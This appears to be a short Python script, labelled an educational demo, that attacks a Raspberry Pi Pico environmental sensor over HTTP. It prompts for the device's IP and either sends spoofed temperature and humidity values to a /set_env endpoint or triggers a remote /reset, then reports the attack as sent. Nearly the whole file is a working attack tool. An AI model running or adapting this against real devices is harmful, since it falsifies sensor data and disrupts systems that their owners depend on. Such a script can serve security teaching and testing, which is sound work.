# Simple Interactive Exploit Tool (Educational Demo Only)

import urllib.request

print("=== PICO VULNERABILITY DEMO TOOL ===")
print("------------------------------------")

# 1️⃣ Ask Target IP
ip = input("Enter Pico IP address: ").strip()

# 2️⃣ Ask Mode
print("\nSelect Mode:")
print("1. Spoof Data")
print("2. Reset System")

choice = input("Enter choice (1 or 2): ").strip()

# 3️⃣ SPOOF MODE
if choice == "1":
    temp = input("Enter fake Temperature: ").strip()
    hum = input("Enter fake Humidity: ").strip()
    
    url = f"http://{ip}/set_env?t={temp}&h={hum}"
    print("\n[*] Sending spoofed data...")

# 4️⃣ RESET MODE
elif choice == "2":
    url = f"http://{ip}/reset"
    print("\n[*] Sending reset command...")

else:
    print("Invalid choice!")
    exit()

# 5️⃣ Send Request
try:
    urllib.request.urlopen(url, timeout=5)
    print("[+] Attack Sent Successfully!")
    print("[+] Check Pico dashboard now.")
except Exception as e:
    print("[-] Failed:", e)